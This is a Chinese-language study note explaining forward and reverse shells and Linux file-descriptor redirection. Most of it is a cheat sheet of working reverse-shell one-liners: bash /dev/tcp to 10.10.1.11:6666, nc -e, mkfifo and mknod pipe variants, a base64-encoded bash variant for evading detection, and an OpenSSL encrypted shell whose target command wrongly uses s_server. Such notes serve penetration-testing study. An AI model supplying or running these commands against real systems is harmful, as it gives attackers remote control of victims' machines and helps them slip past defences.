正向shell：攻击方主动连接目标机器，中间网络不存在阻碍。两者可以互相访问。

反向shell：被控端主动去连接攻击端，通常被控端由于防火墙限制，权限不足，端口占用等问题导致不能正常接受发送过来的数据包。

（反弹shell时我们执行命令的时候是发送请求了吧，还是说只是在连接时存在阻碍，连接建立后阻碍没了？这里留个坑）

Linux

Linux标准文件描述符

用文件描述符标识每个文件对象。Linux一切皆文件，键盘显示器等设备都是文件。

文件描述符 缩写 描述 默认设备
0 STDIN 标准输入 默认设备键盘
1 STDOUT 标准输出 默认设备显示器
2 STDERR 标准错误输出 默认设备显示器

重定向：<是从文件中读取输入，>是将输出保存到文件中，»是将输出追加到文件中。

示例：

  1. 将标准输出位置更改到test:exec 1>test，这样所有命令执行的返回都到这个文件了。
  2. 把当前标准输出重定向到test:echo '1' 1> test。这样只在这条命令生效。
  3. 将标准输入（键盘）读入user变量：read user，然后键盘输入内容，打印：echo $user
  4. 将文件的内容重定向到标准输入：read user 0< test，文件的内容就存到变量中了。
  5. 将标准错误输出（命令出错时的输出）定向到文件：exec 2> test。

再补充一下在另一篇文章 看到的例子：

  1. [n] < word ：将文件描述符n重定向以只读方式到word文件。n没有那默认0。
  2. [n] > word ：将文件描述符n重定向到以写方式word文件。n没有默认1。
  3. &> word 或>& word：将标准输出与标准错误输出以写方式都定向到word文件。等价于> word 2>&1
  4. [n]<&[m]或[n]>&[m]（不能有空格）：将文件描述符n复制到m。前者只读，后者写的形式。
  5. 解析器从左向右解析：2>&1 >file的意思是先将2和1都指向原本1的位置，之后再将1指向file。
  6. 绑定重定向exec，上面有写。
  7. [n]<>word：以读写方式打开word文件，将n重定向到该文件。n没有默认为0

分配自己的文件描述符：

1#创建文件描述符5指向test文件
2exec 5> test
3#将这条命令的标准输出指向5。注意是&5
4echo 'ok' 1>&5
5cat test

/dev/null文件：

1#将标准错误输出重定向到/dev/null，丢掉错误信息
2whoami 2>/dev/null
3
4#清空文件数据
5cat /dev/null > test

反弹shell本质

被控端：bash -i >& /dev/tcp/10.10.1.11/6666 0>&1

控制端：nc -lvvp 6666

（i是交互式的shell，/dev/tecp是linux的一个特殊设备，打开这个文件相关于发起一个socket调用，建立一个socket连接，读写这个文件相当于在这个socket连接中传输数据）

解释：

1bash -i > /dev/tcp/10.10.1.11/6666
2#这是在被控端输入指令，回显在控制端。就是输出重定向到特殊文件（远方的机器）。我们需要在控制端上输入指令，所以说需要将标准输入0重定向到远程机器（特殊文件）的输入。在bash环境下标准输出&1变成了/dev/tcp/10.10.1.11/6666
3
4bash -i < /dev/tcp/10.10.1.11/6666
5#将特殊文件的输入，重定向到bash上。但这时回显的结果看不到。
6
7bash -i > /dev/tcp/10.10.1.11/6666 0>&1
8#同时实现上面两种功能。

bash反弹shell：(&是混合输出的意思，将正常和错误信息都输出)

1bash -i &> /dev/tcp/10.10.1.11/6666 0>&1
2
3bash -i > /dev/tcp/10.10.1.11/6666 0>&1 2>&1

反弹shell方法

Sh

之前的笔记有写。

1nc -lvvp 6666
2nc -e /bin/sh xxx.xxx.xxx.xxx 6666

无-e参数反弹shell：rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc xxx.xxx.xxx.xxx 6666 > /tmp/f

（mkfifo创建管道，cat将管道里面的内容输出给bin/sh，sh执行管道的命令；2>&1将标准输出和错误输出合在一起通过nc传到该管道，形成回路）

还有：mknod backpipe p; nc xxx.xxx.xxx.xxx 6666 0<backpipe | /bin/bash 1>backpipe 2>backpipe

（mknod创建字符设备文件或块设备文件）

Bash

1#第二种
2exec 5<>/dev/tcp/xxx.xxx.xxx.xxx/6666;cat <&5 | while read line;do $line 2>&5 >&5; done
3
4#base64编码绕过
5#先将bash -i >& /dev/tcp/10.10.1.11/6666 0>&1编码
6bash -c "echo 编码 | base64 -d | bash -i"

OpenSSL

1.在远程攻击主机上生成秘钥文件

1openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert,pem -days 365 -nodes

2.在远程攻击主机上启动监视器

1openssl s_server -quiet -key key.pem -cert cert.pem -port 443

3.在目标机上反弹shell

1mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_server -quiet -connect xxx.xxx.xxx.xxx > /tmp/s; rm /tmp/s
